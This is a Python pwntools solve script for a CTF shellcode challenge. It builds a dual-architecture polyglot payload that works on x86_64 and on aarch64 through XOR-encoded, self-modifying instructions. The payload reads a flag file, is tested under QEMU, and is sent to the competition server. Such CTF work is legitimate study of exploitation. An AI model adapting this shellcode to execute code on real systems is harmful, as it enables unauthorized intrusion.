#!/usr/bin/env python3
import uuid

from pwn import *
from subprocess import check_call, check_output


def main():
    with open("x86_64.S", "w") as fp:
        fp.write(
            """
.intel_syntax noprefix
#define STDOUT_FILENO 1
#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_exit 60
#define O_RDONLY 0
#define BUF_SIZE 128
#define FLAG 276
#define BUF 280
#define BASE 0x77
.globl _start
_start:
mov rax, __NR_open
lea rdi, [rip+_start-BASE+FLAG]
mov rsi, O_RDONLY
syscall
push rax
mov rsi, O_RDONLY
mov rax, __NR_read
pop rdi
lea rsi, [rip+_start-BASE+BUF]
mov rdx, BUF_SIZE
syscall
push rax
mov rax, __NR_write
mov rdi, STDOUT_FILENO
pop rdx
syscall
mov rax, __NR_exit
mov rdi, 0
syscall
"""
        )
    check_call(["gcc", "-o", "x86_64.elf", "x86_64.S", "-nostartfiles"])
    check_call(
        ["objcopy", "-O", "binary", "--only-section=.text", "x86_64.elf", "x86_64.bin"]
    )
    with open("x86_64.bin", "rb") as fp:
        x86_64 = fp.read()
    with open("aarch64.S", "w") as fp:
        fp.write(
            """
    .align 12
    .globl _start
    /* 0x00    dispatcher gadget */
_start:
    /* 0x04 */ ldrb w11, [x1], #0x72
    /* 0x08 */ ands w11, w11, w11, lsr #16
    /* 0x0c */ ands w11, w11, w11, lsr #16                 /* w11 = 0 */
    /* 0x10 */ adds w11, w11, #0xedd
    /* 0x14 */ adds w11, w11, #0xedd
    /* 0x18 */ adds w11, w11, #0xedf
    /* 0x1c */ subs w11, w11, #0xc19                       /* w11 = 0x2080 */
    /* 0x20 */ ldeorh w11, w12, [x1]
    /* 0x24 */ ldrb w0, [x1], #-105
    /* 0x28 */ ldrb w0, [x1], #101
    /* 0x2c */ adds w11, w11, #0xedd
    /* 0x30 */ adds w11, w11, #0xedd
    /* 0x34 */ adds w11, w11, #0xedd
    /* 0x38 */ adds w11, w11, #0xedd
    /* 0x3c */ adds w11, w11, #0xedd
    /* 0x40 */ adds w11, w11, #0xedd
    /* 0x44 */ adds w11, w11, #0xedd
    /* 0x48 */ adds w11, w11, #0xedd
    /* 0x4c */ adds w11, w11, #0xedd                       /* w11 = 0xa645 */
    /* 0x50 */ ldeorh w11, w12, [x1]
    /* 0x54 */ adds w11, w11, #0xedd
    /* 0x58 */ adds w11, w11, #0xedd
    /* 0x5c */ adds w11, w11, #0xedd
    /* 0x60 */ ldrb w0, [x1], #114
    /* 0x64 */ ldrb w0, [x1], #-110
    /* 0x68 */ b.eq . + 0xe6444                            /* end qemu tb */
    /* 0x6c */ /* add x0, x1, 272 - 0x72 */
               /* 20 78 02 91 */
               .byte 0x20, 0x78, 0x02 ^ 0x45, 0x91 ^ 0xa6
               /* b _start - 4 - 0x131688 */
               /* 42 3a fb 17 */
    /* 0x70 */ .byte 0x42, 0x3a, 0xfb ^ 0x80, 0x17 ^ 0x20
"""
        )
    check_call(
        ["aarch64-linux-gnu-gcc", "-o", "aarch64.elf", "aarch64.S", "-nostartfiles", "-march=armv8.5-a"]
    )
    check_call(
        [
            "aarch64-linux-gnu-objcopy",
            "-O",
            "binary",
            "--only-section=.text",
            "aarch64.elf",
            "aarch64.bin",
        ]
    )
    with open("aarch64.bin", "rb") as fp:
        aarch64 = fp.read()
    shellcode = flat(
        {
            # shellcode dispatcher
            # x86_64: j . + 0x77
            # aarch64: nop
            0: b"\x75\x75\x5D\x50",
            4: aarch64,
            # 0x77: x86_64,
            272: b"cat flag",
        }
    )
    with open("shellcode.bin", "wb") as fp:
        fp.write(shellcode)
    flag = uuid.uuid4().hex.encode()
    with open("flag", "wb") as fp:
        fp.write(flag)
    if False:
        with open("shellcode.bin", "rb") as fp:
            actual = check_output(["strace", "./chal-x86-64"], stdin=fp)
            assert actual == flag, actual
    with open("shellcode.bin", "rb") as fp:
        actual = check_output(
            [
                "env",
                "QEMU_LD_PREFIX=prefix-aarch64",
                "qemu-aarch64",
                "-strace",
                "./chal-aarch64",
            ],
            stdin=fp,
        )
        assert actual == flag, actual
    with remote("shellcode.2021.ctfcompetition.com", 1337) as tube:
        tube.sendlineafter("Payload:", shellcode)
        tube.interactive()


if __name__ == "__main__":
    main()
